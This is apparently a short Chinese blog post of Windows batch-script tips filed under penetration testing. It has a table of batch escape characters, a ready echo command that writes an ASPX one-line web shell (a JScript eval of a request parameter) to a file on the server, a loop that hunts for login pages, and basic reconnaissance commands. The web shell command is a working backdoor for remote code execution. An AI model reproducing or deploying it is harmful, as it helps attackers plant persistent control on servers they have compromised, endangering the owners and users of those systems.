---
layout: post
title: dos下bat脚本tips
categories: 渗透测试
tag: dos
---

# 说明

windows 下 bat 脚本一些tips

### 转义字符

```text
% 	%% 	May not always be required in doublequoted strings, just try
^ 	^^ 	May not always be required in doublequoted strings, but it won't hurt
& 	^&
< 	^<
> 	^>
| 	^|
' 	^' 	Required only in the FOR /F "subject" (i.e. between the parenthesis), unless backq is used
` 	^` 	Required only in the FOR /F "subject" (i.e. between the parenthesis), if backq is used
, 	^, 	Required only in the FOR /F "subject" (i.e. between the parenthesis), even in doublequoted strings
; 	^;
= 	^=
( 	^(
) 	^)
! 	^^! 	Required only when delayed variable expansion is active
" 	"" 	Required only inside the search pattern of FIND
\ 	\\ 	Required only inside the regex pattern of FINDSTR
[ 	\[
] 	\]
" 	\"
. 	\.
* 	\*
? 	\?
```

### bat 脚本echo 出 aspx 一句话shell

```shell
echo ^<%%@ Page Language^="Jscript"%%^>^<%% eval^(Request.Item["xtghsd"],"unsafe"^);%%^> > e:\error.aspx
```

### 查找文件

  `for /r e:\ %i in (login*.aspx) do @echo %i`

### 信息搜集

- systeminfo
- tasklist
- arp -a
- route print
